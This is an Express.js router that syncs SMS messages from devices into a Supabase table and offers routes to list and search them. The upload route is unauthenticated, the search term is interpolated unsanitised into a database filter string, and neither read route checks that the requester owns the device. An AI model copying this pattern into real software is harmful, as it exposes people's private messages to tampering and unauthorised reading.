const router = require('express').Router();
const { supabase } = require('../config/supabase');
const { auth, deviceAuth } = require('../middleware/auth');

// Get SMS for device
router.get('/:deviceId', auth, async (req, res) => {
  try {
    const { page = 1, limit = 50 } = req.query;
    const offset = (page - 1) * limit;

    const { data, error, count } = await supabase
      .from('sms_messages')
      .select('*', { count: 'exact' })
      .eq('device_id', req.params.deviceId)
      .order('timestamp', { ascending: false })
      .range(offset, offset + limit - 1);

    if (error) throw error;
    res.json({ messages: data, total: count, page: +page, limit: +limit });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Device uploads SMS
router.post('/sync', async (req, res) => {
  try {
    const { deviceId, messages } = req.body;
    if (!deviceId || !messages) return res.status(400).json({ error: 'Missing data' });

    const inserts = messages.map(m => ({
      device_id: deviceId,
      direction: m.direction,
      sender: m.from || m.sender || m.phone || '',
      receiver: m.receiver || '',
      body: m.body || m.message || m.text || '',
      timestamp: m.timestamp || m.time || new Date()
    }));

    const { data, error } = await supabase
      .from('sms_messages')
      .insert(inserts)
      .select();

    if (error) throw error;
    res.json({ synced: data.length });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Search SMS
router.get('/:deviceId/search', auth, async (req, res) => {
  try {
    const { q } = req.query;
    const { data, error } = await supabase
      .from('sms_messages')
      .select('*')
      .eq('device_id', req.params.deviceId)
      .or(`body.ilike.%${q}%,sender.ilike.%${q}%,receiver.ilike.%${q}%`)
      .order('timestamp', { ascending: false })
      .limit(100);

    if (error) throw error;
    res.json(data);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

module.exports = router;
